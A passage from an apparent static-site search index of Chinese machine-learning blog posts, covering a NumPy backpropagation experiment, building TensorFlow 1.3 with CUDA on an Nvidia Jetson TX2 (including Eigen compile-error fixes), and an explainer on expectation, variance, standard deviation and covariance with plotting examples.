np.random.rand(4, 1) 训练过程主要代码：\n# x/y is for drawing chart x=[] y=[] # learning rate eta = 0.1 loop = 0 while loop \u0026lt; 50000: # feed forward calculation z_layer_2 = np.dot(input, weight_layer_1) a_layer_2 = sigmoid(z_layer_2) z_layer_3 = np.dot(a_layer_2, weight_layer_2) a_layer_3 = sigmoid(z_layer_3) if loop % 100 == 0: # calculate the cost c = cost(output, a_layer_3) print \u0026quot;[%d] Cost: %f\u0026quot; % (loop, c) print \u0026quot;Perception: \u0026quot;, a_layer_3 x.append(loop) y.append(c) loop += 1 # back propagation # calculate delta_3 delta_layer_3 = cost_derivative(output, a_layer_3)*deriv_z(a_layer_3) # calculate delta_2 delta_layer_2 = np.dot(delta_layer_3, weight_layer_2.T)*deriv_z(a_layer_2) # there is NO delta_layer_1, since layer1 is the input layer # calculate new weight for layer 2 weight_layer_2 -= eta*np.dot(a_layer_2.T, delta_layer_3) # calculate new weight for layer 1 weight_layer_1 -= eta*np.dot(input.T, delta_layer_2) 上面代码可以观察到每100次计算修正后的代价函数输出以及预测值，可以发现代价值在逐渐趋近于0，说明误差在降低，预测值越来越接近实际采样的数值。\n为了更加清晰的看到这个过程，把x/y输出在图上进行查看，可以观察到拟合过程，并且可以看到拟合的速度变化情况。\nimport matplotlib.pyplot as plt plt.plot(x, y) plt.xlabel(\u0026quot;Epoch\u0026quot;) plt.ylabel(\u0026quot;Cost\u0026quot;) plt.show() 完整代码\n参考 https://www.youtube.com/watch?v=mOmkv5SI9hU\u0026amp;list=PLLssT5z_DsK-h9vYZkQkYNWcItqhlRJLN\u0026amp;index=52\nhttp://www.cnblogs.com/charlotte77/p/5629865.html\n", 
    "url": "http:\/\/localhost:1313\/post\/machinelearning\/neuralnetwork\/bp-experiment\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/machinelearning\/tensorflow\/tensorflow_on_jetson2\/": {
        
        "title": "在 Nvidia Jetson TX2 上编译安装tensorflow",
            "tags": [ "nvidia",  "Jetson",  "TX2",  "tensorflow", ],
    "content": " 系统环境 Jetpack：v3.0 CUDA：8.0 cuDNN：5.1.10 编译安装bazel bazel是google开发的一套开发管理工具，功能类似makefile和maven，特点是速度快，编译tensorflow时需要用到这个工具。\n在TX2上安装bazel需要对bazel源代码做一点修改以支持该平台。下载代码后修改文件 \u0026ldquo;bazel/src/main/java/com/google/devtools/build/lib/util/CPU.java\u0026rdquo;，修改如下：\npublic enum CPU { X86_32(\u0026quot;x86_32\u0026quot;, ImmutableSet.of(\u0026quot;i386\u0026quot;, \u0026quot;i486\u0026quot;, \u0026quot;i586\u0026quot;, \u0026quot;i686\u0026quot;, \u0026quot;i786\u0026quot;, \u0026quot;x86\u0026quot;)), X86_64(\u0026quot;x86_64\u0026quot;, ImmutableSet.of(\u0026quot;amd64\u0026quot;, \u0026quot;x86_64\u0026quot;, \u0026quot;x64\u0026quot;)), PPC(\u0026quot;ppc\u0026quot;, ImmutableSet.of(\u0026quot;ppc\u0026quot;, \u0026quot;ppc64\u0026quot;, \u0026quot;ppc64le\u0026quot;)), - ARM(\u0026quot;arm\u0026quot;, ImmutableSet.of(\u0026quot;arm\u0026quot;, \u0026quot;armv7l\u0026quot;)), + ARM(\u0026quot;arm\u0026quot;, ImmutableSet.of(\u0026quot;arm\u0026quot;, \u0026quot;armv7l\u0026quot;, \u0026quot;aarch64\u0026quot;)), S390X(\u0026quot;s390x\u0026quot;, ImmutableSet.of(\u0026quot;s390x\u0026quot;, \u0026quot;s390\u0026quot;)), UNKNOWN(\u0026quot;unknown\u0026quot;, ImmutableSet.\u0026lt;String\u0026gt;of()); 修改好之后在代码目录运行 \u0026ldquo;compile.sh\u0026rdquo; 进行编译，编译好后将程序拷贝到执行环境：\n$ sudo cp output/bazel /usr/local/bin 安装tensorflow 下载tensorflow源码 写这篇文章的时候tensorflow已经发展到了v1.3，下载release版本代码：\n$ wget https://github.com/tensorflow/tensorflow/archive/v1.3.0.tar.gz 编译tensorflow 配置configure 首先configure编译环境：\nnvidia@tegra-ubuntu:~/tensorflow/tensorflow-1.3.0$ ./configure You have bazel 0.4.5- installed. Please specify the location of python. [Default is /usr/bin/python]: Found possible Python library paths: /usr/local/lib/python2.7/dist-packages /usr/lib/python2.7/dist-packages Please input the desired Python library path to use. Default is [/usr/local/lib/python2.7/dist-packages] Using python library path: /usr/local/lib/python2.7/dist-packages Do you wish to build TensorFlow with MKL support? [y/N] No MKL support will be enabled for TensorFlow Please specify optimization flags to use during compilation when bazel option \u0026quot;--config=opt\u0026quot; is specified [Default is -march=native]: Do you wish to use jemalloc as the malloc implementation? [Y/n] jemalloc enabled Do you wish to build TensorFlow with Google Cloud Platform support? [y/N] No Google Cloud Platform support will be enabled for TensorFlow Do you wish to build TensorFlow with Hadoop File System support? [y/N] No Hadoop File System support will be enabled for TensorFlow Do you wish to build TensorFlow with the XLA just-in-time compiler (experimental)? [y/N] No XLA support will be enabled for TensorFlow Do you wish to build TensorFlow with VERBS support? [y/N] No VERBS support will be enabled for TensorFlow Do you wish to build TensorFlow with OpenCL support? [y/N] No OpenCL support will be enabled for TensorFlow Do you wish to build TensorFlow with CUDA support? [y/N] y CUDA support will be enabled for TensorFlow Do you want to use clang as CUDA compiler? [y/N] nvcc will be used as CUDA compiler Please specify the CUDA SDK version you want to use, e.g. 7.0. [Leave empty to default to CUDA 8.0]: 8.0 Please specify the location where CUDA 8.0 toolkit is installed. Refer to README.md for more details. [Default is /usr/local/cuda]: Please specify which gcc should be used by nvcc as the host compiler. [Default is /usr/bin/gcc]: Please specify the cuDNN version you want to use. [Leave empty to default to cuDNN 6.0]: 5.1.10 Please specify the location where cuDNN 5.1.10 library is installed. Refer to README.md for more details. [Default is /usr/local/cuda]: ./configure: line 669: /usr/local/cuda/extras/demo_suite/deviceQuery: No such file or directory Please specify a list of comma-separated Cuda compute capabilities you want to build with. You can find the compute capability of your device at: https://developer.nvidia.com/cuda-gpus. Please note that each additional compute capability significantly increases your build time and binary size. [Default is: \u0026quot;3.5,5.2\u0026quot;]: 6.2 Do you wish to build TensorFlow with MPI support? [y/N] MPI support will not be enabled for TensorFlow Configuration finished 这里主要说一下配置\u0026quot;compute capability\u0026quot;的方法，默认值为\u0026quot;3.5,5.2\u0026quot;，但到底该填写什么值可以通过一个jetpack自带的程序查询出来：\nnvidia@tegra-ubuntu:~/NVIDIA_CUDA-8.0_Samples/1_Utilities/deviceQuery$ ./deviceQuery ./deviceQuery Starting... CUDA Device Query (Runtime API) version (CUDART static linking) Detected 1 CUDA Capable device(s) Device 0: \u0026quot;GP10B\u0026quot; CUDA Driver Version / Runtime Version 8.5 / 8.0 CUDA Capability Major/Minor version number: 6.2 Total amount of global memory: 7854 MBytes (8235577344 bytes) ( 2) Multiprocessors, (128) CUDA Cores/MP: 256 CUDA Cores GPU Max Clock rate: 1301 MHz (1.30 GHz) Memory Clock rate: 13 Mhz Memory Bus Width: 64-bit L2 Cache Size: 524288 bytes Maximum Texture Dimension Size (x,y,z) 1D=(131072), 2D=(131072, 65536), 3D=(16384, 16384, 16384) Maximum Layered 1D Texture Size, (num) layers 1D=(32768), 2048 layers Maximum Layered 2D Texture Size, (num) layers 2D=(32768, 32768), 2048 layers Total amount of constant memory: 65536 bytes Total amount of shared memory per block: 49152 bytes Total number of registers available per block: 32768 Warp size: 32 Maximum number of threads per multiprocessor: 2048 Maximum number of threads per block: 1024 Max dimension size of a thread block (x,y,z): (1024, 1024, 64) Max dimension size of a grid size (x,y,z): (2147483647, 65535, 65535) Maximum memory pitch: 2147483647 bytes Texture alignment: 512 bytes Concurrent copy and kernel execution: Yes with 1 copy engine(s) Run time limit on kernels: No Integrated GPU sharing Host Memory: Yes Support host page-locked memory mapping: Yes Alignment requirement for Surfaces: Yes Device has ECC support: Disabled Device supports Unified Addressing (UVA): Yes Device PCI Domain ID / Bus ID / location ID: 0 / 0 / 0 Compute Mode: \u0026lt; Default (multiple host threads can use ::cudaSetDevice() with device simultaneously) \u0026gt; deviceQuery, CUDA Driver = CUDART, CUDA Driver Version = 8.5, CUDA Runtime Version = 8.0, NumDevs = 1, Device0 = GP10B Result = PASS 主意上面的内容中有下面一行内容，这行的内容就是\u0026quot;compute capability\u0026quot;：\nCUDA Capability Major/Minor version number: 6.2 编译tensorflow 执行下面的命令进行编译，并指定使用cuda\nnvidia@tegra-ubuntu:~/tensorflow$ bazel build --config=opt --config=cuda //tensorflow/tools/pip_package:build_pip_package 生成pip安装包 执行完之后会生成pip包生成脚本 \u0026ldquo;./bazel-bin/tensorflow/tools/pip_package/build_pip_package\u0026rdquo;，可以执行这个脚本生成pip安装包：\nnvidia@tegra-ubuntu:~/tensorflow/tensorflow-1.3.0$ ./bazel-bin/tensorflow/tools/pip_package/build_pip_package ~/tensorflow Wed Sep 13 14:41:13 UTC 2017 : === Using tmpdir: /tmp/tmp.F109O2nAzd ~/tensorflow/tensorflow-1.3.0/bazel-bin/tensorflow/tools/pip_package/build_pip_package.runfiles ~/tensorflow/tensorflow-1.3.0 ~/tensorflow/tensorflow-1.3.0 /tmp/tmp.F109O2nAzd ~/tensorflow/tensorflow-1.3.0 Wed Sep 13 14:41:20 UTC 2017 : === Building wheel warning: no files found matching '*.dll' under directory '*' warning: no files found matching '*.lib' under directory '*' warning: no files found matching '*.h' under directory 'tensorflow/include/tensorflow' warning: no files found matching '*' under directory 'tensorflow/include/Eigen' warning: no files found matching '*' under directory 'tensorflow/include/external' warning: no files found matching '*.h' under directory 'tensorflow/include/google' warning: no files found matching '*' under directory 'tensorflow/include/third_party' warning: no files found matching '*' under directory 'tensorflow/include/unsupported' ~/tensorflow/tensorflow-1.3.0 Wed Sep 13 14:41:52 UTC 2017 : === Output wheel file is in: /home/nvidia/tensorflow 安装tensorflow 执行下面的命令安装：\n$ pip install tensorflow-1.3.0-cp27-cp27mu-linux_aarch64.whl eigen导致编译错误处理 在编译tensorflow的过程中碰到了几个问题，主要是由于eigen引起。\n错误1: Jacobi.h has no member named \u0026lsquo;pmul\u0026rsquo; ... In file included from external/eigen_archive/Eigen/Jacobi:27:0, from external/eigen_archive/Eigen/Eigenvalues:16, from ./third_party/eigen3/Eigen/Eigenvalues:1, from tensorflow/core/kernels/self_adjoint_eig_v2_op.cc:19: external/eigen_archive/Eigen/src/Jacobi/Jacobi.h: In instantiation of 'void Eigen::internal::apply_rotation_in_the_plane(Eigen::DenseBase\u0026lt;Derived\u0026gt;\u0026amp;, Eigen::DenseBase\u0026lt;Derived\u0026gt;\u0026amp;, const Eigen::J acobiRotation\u0026lt;OtherScalar\u0026gt;\u0026amp;) [with VectorX = Eigen::Block\u0026lt;Eigen::Map\u0026lt;Eigen::Matrix\u0026lt;std::complex\u0026lt;float\u0026gt;, -1, -1\u0026gt;, 0, Eigen::Stride\u0026lt;0, 0\u0026gt; \u0026gt;, -1, 1, true\u0026gt;; VectorY = Eigen::Block\u0026lt;Eigen::Map\u0026lt;Eige n::Matrix\u0026lt;std::complex\u0026lt;float\u0026gt;, -1, -1\u0026gt;, 0, Eigen::Stride\u0026lt;0, 0\u0026gt; \u0026gt;, -1, 1, true\u0026gt;; OtherScalar = float]': external/eigen_archive/Eigen/src/Jacobi/Jacobi.h:297:40: required from 'void Eigen::MatrixBase\u0026lt;Derived\u0026gt;::applyOnTheRight(Eigen::Index, Eigen::Index, const Eigen::JacobiRotation\u0026lt;OtherScalar\u0026gt; \u0026amp;) [with OtherScalar = float; Derived = Eigen::Map\u0026lt;Eigen::Matrix\u0026lt;std::complex\u0026lt;float\u0026gt;, -1, -1\u0026gt;, 0, Eigen::Stride\u0026lt;0, 0\u0026gt; \u0026gt;; Eigen::Index = long int]' external/eigen_archive/Eigen/src/Eigenvalues/SelfAdjointEigenSolver.h:861:7: required from 'void Eigen::internal::tridiagonal_qr_step(RealScalar*, RealScalar*, Index, Index, Scalar*, Index) [with int StorageOrder = 0; RealScalar = float; Scalar = std::complex\u0026lt;float\u0026gt;; Index = long int]' external/eigen_archive/Eigen/src/Eigenvalues/SelfAdjointEigenSolver.h:520:87: required from 'Eigen::ComputationInfo Eigen::internal::computeFromTridiagonal_impl(DiagType\u0026amp;, SubDiagType\u0026amp;, Eig en::Index, bool, MatrixType\u0026amp;) [with MatrixType = Eigen::Matrix\u0026lt;std::complex\u0026lt;float\u0026gt;, -1, -1\u0026gt;; DiagType = Eigen::Matrix\u0026lt;float, -1, 1\u0026gt;; SubDiagType = Eigen::Matrix\u0026lt;float, -1, 1\u0026gt;; Eigen::Index = long int]' .... external/eigen_archive/Eigen/src/Jacobi/Jacobi.h:386:35: error: 'struct Eigen::internal::conj_helper\u0026lt;__vector(4) float, Eigen::internal::Packet2cf, false, false\u0026gt;' has no member named 'pmul' external/eigen_archive/Eigen/src/Jacobi/Jacobi.h:415:22: error: 'struct Eigen::internal::conj_helper\u0026lt;__vector(4) float, Eigen::internal::Packet2cf, false, false\u0026gt;' has no member named 'pmul' pstore(px, padd(pm.pmul(pc,xi),pcj.pmul(ps,yi))); ^ external/eigen_archive/Eigen/src/Jacobi/Jacobi.h:415:22: error: 'struct Eigen::internal::conj_helper\u0026lt;__vector(4) float, Eigen::internal::Packet2cf, false, false\u0026gt;' has no member named 'pmul' external/eigen_archive/Eigen/src/Jacobi/Jacobi.h:416:22: error: 'struct Eigen::internal::conj_helper\u0026lt;__vector(4) float, Eigen::internal::Packet2cf, false, false\u0026gt;' has no member named 'pmul' pstore(py, psub(pcj.pmul(pc,yi),pm.pmul(ps,xi))); ^ external/eigen_archive/Eigen/src/Jacobi/Jacobi.h:416:22: error: 'struct Eigen::internal::conj_helper\u0026lt;__vector(4) float, Eigen::internal::Packet2cf, false, false\u0026gt;' has no member named 'pmul' Target //tensorflow/tools/pip_package:build_pip_package failed to build Use --verbose_failures to see the command lines of failed build steps. INFO: Elapsed time: 2366.425s, Critical Path: 2221.96s 错误2: tensorflow/core/lib/core/threadpool.cc NonBlockingThreadPoolTempl()参数错误 ERROR: /home/nvidia/tensorflow/tensorflow-1.3.0/tensorflow/core/BUILD:1244:1: C++ compilation of rule '//tensorflow/core:lib_internal' failed: crosstool_wrapper_driver_is_not_gcc failed: error executing command external/ local_config_cuda/crosstool/clang/bin/crosstool_wrapper_driver_is_not_gcc -U_FORTIFY_SOURCE '-D_FORTIFY_SOURCE=1' -fstack-protector -fPIE -Wall -Wunused-but-set-parameter ... (remaining 115 argument(s) skipped): com.google.devtools.build.lib.shell.BadExitStatusException: Process exited with status 1. tensorflow/core/lib/core/threadpool.cc: In constructor 'tensorflow::thread::ThreadPool::Impl::Impl(tensorflow::Env*, const tensorflow::ThreadOptions\u0026amp;, const string\u0026amp;, int, bool)': tensorflow/core/lib/core/threadpool.cc:91:56: error: no matching function for call to 'Eigen::NonBlockingThreadPoolTempl\u0026lt;tensorflow::thread::EigenEnvironment\u0026gt;::NonBlockingThreadPoolTempl(int\u0026amp;, bool\u0026amp;, tensorflow::thread:: EigenEnvironment)' EigenEnvironment(env, thread_options, name)) {} ^ In file included from external/eigen_archive/unsupported/Eigen/CXX11/ThreadPool:58:0, from external/eigen_archive/unsupported/Eigen/CXX11/Tensor:72, from ./third_party/eigen3/unsupported/Eigen/CXX11/Tensor:1, from tensorflow/core/lib/core/threadpool.cc:19: external/eigen_archive/unsupported/Eigen/CXX11/src/ThreadPool/NonBlockingThreadPool.h:22:3: note: candidate: Eigen::NonBlockingThreadPoolTempl\u0026lt;Environment\u0026gt;::NonBlockingThreadPoolTempl(int, Environment) [with Environment = tensorflow::thread::EigenEnvironment] NonBlockingThreadPoolTempl(int num_threads, Environment env = Environment()) ^ external/eigen_archive/unsupported/Eigen/CXX11/src/ThreadPool/NonBlockingThreadPool.h:22:3: note: candidate expects 2 arguments, 3 provided Target //tensorflow/tools/pip_package:build_pip_package failed to build Use --verbose_failures to see the command lines of failed build steps. INFO: Elapsed time: 292.433s, Critical Path: 68.80s 解决方法是使用正确版本的eigen，其中“问题一”是用v3.3.4的eigen可以解决，“问题二”需要使用最新的eigen：\n修复的方法是编辑\u0026quot;tensorflow/workspace.bzl\u0026quot;，并指定最新的eigen：\nnative.new_http_archive( name = \u0026quot;eigen_archive\u0026quot;, #urls = [ # \u0026quot;http://mirror.bazel.build/bitbucket.org/eigen/eigen/get/f3a22f35b044.tar.gz\u0026quot;, # \u0026quot;https://bitbucket.org/eigen/eigen/get/f3a22f35b044.tar.gz\u0026quot;, #], #sha256 = \u0026quot;ca7beac153d4059c02c8fc59816c82d54ea47fe58365e8aded4082ded0b820c4\u0026quot;, #strip_prefix = \u0026quot;eigen-eigen-f3a22f35b044\u0026quot;, urls = [ \u0026quot;https://bitbucket.org/eigen/eigen/get/tip.tar.gz\u0026quot;, ], sha256 = \u0026quot;6fe7af8244ab5d9c314a26bc8615adc61269896cfd66f1ae2cce3d6ee91a5b88\u0026quot;, strip_prefix = \u0026quot;eigen-eigen-034fba127699\u0026quot;, build_file = str(Label(\u0026quot;//third_party:eigen.BUILD\u0026quot;)), ) 其中“sha256”和“strip_prefix”需要根据新的eigen修正。\n", 
    "url": "http:\/\/localhost:1313\/post\/machinelearning\/tensorflow\/tensorflow_on_jetson2\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/machinelearning\/math\/": {
        
        "title": "Math",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/post\/machinelearning\/math\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/%E5%8D%8F%E6%96%B9%E5%B7%AE\/": {
        
        "title": "协方差",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/%E5%8D%8F%E6%96%B9%E5%B7%AE\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/%E5%8D%8F%E6%96%B9%E5%B7%AE%E7%9F%A9%E9%98%B5\/": {
        
        "title": "协方差矩阵",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/%E5%8D%8F%E6%96%B9%E5%B7%AE%E7%9F%A9%E9%98%B5\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/%E6%95%B0%E5%AD%A6%E6%9C%9F%E6%9C%9B\/": {
        
        "title": "数学期望",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/%E6%95%B0%E5%AD%A6%E6%9C%9F%E6%9C%9B\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/machinelearning\/math\/variance_covariance\/": {
        
        "title": "数学期望、方差、标准差、协方差",
            "tags": [ "数学期望",  "方差",  "标准差",  "协方差",  "协方差矩阵", ],
    "content": " 最近在学习机器学习的过程中发现了许多上学时在概率论和统计学课上学过的知识点，可是年代久远已经都忘记了，重新学起来还是费了不少力气，不过因为带着目的学习所以也有了一些新的认识。\n数学期望（mean） 概率论中描述一个随机事件中的随机变量的平均值的大小可以使用“数学期望”（mean）这个概念。\n数学期望的定义是实验中每次可能的结果的概率乘以其结果的总和。\n离散型随机量的数学期望 定义：离散型随机变量的所有可能取值 $ x_i $ 与其对应的概率 $ P( x_i ) $ 乘积的和为该离散型随机量的数学期望，记为 $ E(X) $。\n公式：\n$$ E(X) = \\sum_{i=1}^n x_i P_i$$ 连续型随机量的数学期望 定义：假设连续型随机变量 $ X $ 的概率密度函数为 $ f(x) $ ，如果积分 $ \\int_{-\\infty}^{+\\infty} xf(x) ,{\\rm d}x $ 绝对收敛，则称这个积分的值为连续型随机量的数学期望，记为 $ E(X) $。\n公式：\n$$ E(X) = \\int_{-\\infty}^{+\\infty} xf(x) \\,{\\rm d}x $$ 数学期望的性质 设C为常数： $ E(C) = C $ 设C为常数： $ E(CX) = CE(X) $ 加法：$ E(X+Y) = E(X) + E(Y) $ 当X和Y相互独立时，$ E(XY) = E(X)E(Y) $ （主意，X和Y的相互独立性可以通过下面的“协方差”描述） 数学期望的意义 根据根据“大数定律”的描述，这个数字的意义是指随着重复次数接近无穷大时，数值的算术平均值几乎肯定收敛于数学期望值，也就是说数学期望值可以用于预测一个随机事件的平均预期情况。\n均值 在往下面的内容走之前说一个简单的概念“均值”，就是平均数。\n定义： 给定一个包含n个样本的集合 X={X1, \u0026hellip;Xn}，均值就是这个集合中所有元素和的平均值。\n公式： $ \\overline X = {{\\sum_{i=1}^n X_i } \\over {n}} $\n方差(Variance) 方差是在概率论和统计方差衡量随机变量或一组数据时离散程度的度量，换句话说如果想知道一组数据之间的分散程度的话就可以使用“方差”来表示了。\n方差有两个定义，一个是统计学的定义，一个是概率论的定义。\n统计学方差 定义：在统计描述中，方差用来计算每一个变量（观察值）与总体均数之间的差异。为避免出现离均差总和为零，离均差平方和受样本含量的影响，统计学采用平均离均差平方和来描述变量的变异程度。\n公式：\n$$ \\sigma^2 = {\\sum_{i=1}^N(X-\\mu)^2 \\over N} $$ 其中 $ \\sigma^2 $ 为总体方差，X为变量，$ \\mu $ 为整体均值， N为总体例数。\n样本方差 由于在实际环境里是没有办法穷举所有例子，所以只能找出部分的样本数据，基于这部分样本进行测算。那么可以把公式转换成：\n$$ S^2 = {{\\sum_{i=1}^n(X_i - \\overline X)}^2 \\over (n - 1)} $$ 其中 $ S^2 $ 为样本方差， $ \\overline X $ 是采集样本的均值，$ n $ 为样本的个数。\n概率论方差 在概率分布中，设X是一个离散型随机变量\n定义：在概率分布中，设X是一个离散型随机变量，若 $ E((X-E(X))^2) $ 存在，则称 $ E((X-E(X))^2) $ 为X的方差，记为 $ D(X) $ , $ Var(X) $ 或 $ DX $，其中 $ E(X) $ 是X的期望值，X是变量值，公式中的 $ E $ 是期望值expected value的缩写，意为“变量值与其期望值之差的平方和”的期望值。\n离散型随机变量方差计算公式：\n$$ D(X) = E((X-E(X))^2) = E(X^2) - (E(X))^2 $$ 连续性变量X，若其定义域为 $ (a,b) $，概率密度函数为 $ f(x) $，连续型随机变量X方差计算公式： $$ D(X) = \\int_a^b (x - \\mu)^2f(x) \\,{\\rm d}x $$ 方差的意义 那么什么是分散程度呢？举个例子，比如说两个人在游乐场里玩射击游戏时打出了n发子弹，这些子弹有写离靶心近一些，有的远一些，但统计下来这两个人的得分可能相同，这时候如何区分这两个人的水平高低呢？比较直观的一个想法就是看谁的射击弹着点比较集中啦。\n标准差（Standard Deviation） 定义：又叫均方差，是离均差平方的算术平均数的平方根，用$ \\sigma $ 表示。标准差是\u0026quot;方差\u0026quot;的算术平方根。标准差能反映一个数据集的离散程度。平均数相同的两组数据，标准差未必相同。\n公式：\n$$ \\sigma = \\sqrt 方差 = \\sqrt {\\sum_{i=1}^N(X-\\mu)^2 \\over N} $$ 样本标准差 类似样本方差，在实际情况中很难知道所有的情况只能靠抽样来估算实际的标准差。\n$$ S = \\sqrt 样本方差 = \\sqrt {{{\\sum_{i=1}^n(X_i - \\overline X)}^2 \\over (n - 1)}} $$ 意义 标准差和方差一样都是用于衡量样本的离散程度的量，那么为什么要有标准差呢？因为方差和样本的“量纲”不一样，换句话说不在一个层次。怎么理解这个层次呢，从公式看方差是样本与均值的差的平方和的平均，这里有一个平方运算，这是导致量纲不在同一个层次的原因。\n比如两个集合 $ [0，8，12，20] $ 和 $ [8，9，11，12] $ ，两个集合的均值都是10，两个集合的方差分别是：69.33和3.33；计算两者的标准差分别是：8.3和1.8。数字越大代表越离散，从数值上看方差和标准差的量纲差别就很明显了，而标准差更好的在量纲上与样本集合保持同步。这就是“标准”的意义了。\n协方差（Covariance） 前面的方差／标准差描述的是一维数据集合的离散程度，但世界上的现象普遍是多维度数据描述的。那么很自然就会想知道现象和数据的相关程度，以及各维度数据间的相关程度。\n比如，一个产品卖的好不好可能有很多因素构成，比如产品质量、价格等。那么是否质量和价格之间有相关性呢？这个问题就可以用协方差来解决。\n概率论协方差 公式：期望值分别为 $ E(X) $ 和 $ E(Y) $ 的两个变量X和Y的协方差为： $$ Cov(X,Y) = E[(X-E(X))(Y-E(Y))] $$ $$ = E(XY)- 2E(X)E(Y) + E(X)E(Y) $$ $$ = E(XY)- E(X)E(Y) $$ 协方差表示的是两个变量的总体的误差，这与只表示一个变量误差的方差不同。如果两个变量的变化趋势一致，也就是说如果其中一个大于自身的期望值，另外一个也大于自身的期望值，那么两个变量之间的协方差就是正值。 如果两个变量的变化趋势相反，即其中一个大于自身的期望值，另外一个却小于自身的期望值，那么两个变量之间的协方差就是负值。\n如果X 与Y 是统计独立的，那么二者之间的协方差就是0，则：\n$ E(XY) = E(X)E(Y) $\n统计学样本协方差 对于包含两个随机变量关系的统计量，我们可以仿照方差的定义：\n公式： $$ cov(X,Y) = {{\\sum_{i=1}^n (X_i - \\overline X)(Y_i - \\overline Y)} \\over (n-1)} $$ 注：从协方差公式可以看出“方差”是协方差在 $ Y=X $ 时的特殊情况。\n协方差性质 同一个变量的协方差等于其方差：$ Cov(X, X) = Var(X) $ $ Cov(aX, bY) = ab Cov(X, Y) $ (a, b为常量) $ Cov(X_1 + X_2, Y) = Cov(X_1, Y) + Cov(X_2, Y) $ 相关系数 (Correlation） 协方差作为描述X和Y相关程度的量，在同一物理量纲之下有一定的作用，但同样的两个量采用不同的量纲使它们的协方差在数值上表现出很大的差异。为此引入如下概念：\n$$ \\eta = Corr(X, Y) = {Cov(X, Y) \\over \\sqrt {Var(X) \\cdot Var(Y)} }$$ 相关关系 相关性是一个衡量线性独立的无量纲数，其取值在 $ [-1,+1] $ 之间。\n相关性 η = 1时称为“完全线性相关”，此时将 $ Y_i $ 对 $ X_i $作Y-X 散点图，将得到一组精确置換在直线上的点；相关性数值介于－1到1之间时，其绝对值越接近1表明线性相关性越好，作散点图得到的点的排布越接近一条直线。 相关性 η = －1时称为“完全线性负相关”，作图与 η = －1类似也在一条直线上，但方向不同。 相关性 η = 0时两个随机变量又被称为是不相关，“线性无关”、“线性不相关”，这仅仅表明X 与Y 两随机变量之间没有线性相关性，并非表示它们之间一定没有任何内在的（非线性）函数关系 协方差矩阵 假设数据集有{x, y, z}三个维度，那么其协方差矩阵为：\n其中:\n$$ Cov(X,X) = Var(X) $$ $$ Cov(Y,Y) = Var(Y) $$ $$ Cov(Z,Z) = Var(Z) $$ 可以看出来协方差矩阵有几个特点：\n对角线上每个元素的值为方差 协方差矩阵是对称矩阵 怎么理解协方差矩阵的意义呢？假设我们在做一项数据分析，每一项数据包含若干指标，那么协方差矩阵的对角线上的每一项可以告诉我们收集数据的分散程度，其它项综合起来可以用前面的相关性方程 $ \\eta = Corr(X, Y) = {Cov(X, Y) \\over \\sqrt {Var(X) \\cdot Var(Y)} }$ 计算出指标间的相互影响关系。\n正相关： import numpy as np import matplotlib.pyplot as plt x, y = np.random.multivariate_normal([0, 0], [[1, 0.9], [0.9, 1]], 1000).T plt.plot(x, y, 'x') plt.axis('equal') plt.show() 从图中可以看出来x和y之间的关系是一个变大的同时另一个也变大，这说明x和y是正相关，$ \\eta = Corr(X, Y) = {Cov(X, Y) \\over \\sqrt {Var(X) \\cdot Var(Y)} } = { 0.9 \\over \\sqrt {1*1}} = 0.9 \u0026gt; 0 $ 也说明了这一点。\n指标x的方差$ Cov(x,x) = 1 $和y的方差 $ Cov(y,y) = 1 $说明数据分散不太严重，这一点可以从数据点分散的坐标范围看出来。\n分散正相关 import numpy as np import matplotlib.pyplot as plt x, y = np.random.multivariate_normal([0, 0], [[5, 4.9], [4.9, 5]], 1000).T plt.plot(x, y, 'x') plt.axis('equal') plt.show() 从图中可以看出来x和y之间正相关，并且$ \\eta = Corr(X, Y) = {Cov(X, Y) \\over \\sqrt {Var(X) \\cdot Var(Y)} } = { 4.9 \\over \\sqrt {5*5}} = 0.98 \u0026gt; 0 $ 也说明了这一点。\n指标x的方差$ Cov(x,x) = 5 $和y的方差 $ Cov(y,y) = 5 $说明数据分散性比前面的例子大了，数据点分散的坐标范围比前面的大了。\n分散负相关： import numpy as np import matplotlib.pyplot as plt x, y = np.random.multivariate_normal([0, 0], [[5, -4.9], [-4.9, 5]], 1000).T plt.plot(x, y, 'x') plt.axis('equal') plt.show() 从图中可以看出来x和y之间负相关，并且$ \\eta = Corr(X, Y) = {Cov(X, Y) \\over \\sqrt {Var(X) \\cdot Var(Y)} } = { -4.9 \\over \\sqrt {5*5}} = -0.98 \u0026lt; 0 $ 也说明了这一点。\n指标x的方差$ Cov(x,x) = 5 $和y的方差 $ Cov(y,y) = 5 $说明数据分散性比前面的例子大了，数据点分散的坐标范围比前面的大了。\n分散不相关： import numpy as np import matplotlib.pyplot as plt x, y = np.random.multivariate_normal([0, 0], [[5, 0.1], [0.1, 5]], 1000).T plt.plot(x, y, 'x') plt.axis('equal') plt.show() 从图中可以看出来每个点都比较分散而且点与点之间没有明显的关系，并且$ \\eta = Corr(X, Y) = {Cov(X, Y) \\over \\sqrt {Var(X) \\cdot Var(Y)} } = { 0.1 \\over \\sqrt {5*5}} = 0.02 \\approx 0 $ 也说明了这一点。\n指标x的方差$ Cov(x,x) = 5 $和y的方差 $ Cov(y,y) = 5 $说明数据分散性比前面的例子大了，数据点分散的坐标范围比前面的大了。\n参考 https://baike.baidu.com/item/数学期望\nhttps://baike.baidu.com/item/方差\nhttp://blog.sina.com.cn/s/blog_672c5a470100miqq.html\nhttps://zh.wikipedia.org/wiki/协方差\n", 
    "url": "http:\/\/localhost:1313\/post\/machinelearning\/math\/variance_covariance\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/%E6%96%B9%E5%B7%AE\/": {
        
        "title": "方差",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/%E6%96%B9%E5%B7%AE\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/%E6%A0%87%E5%87%86%E5%B7%AE\/": {
        
        "title": "标准差",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/%E6%A0%87%E5%87%86%E5%B7%AE\/"
        },
    
    
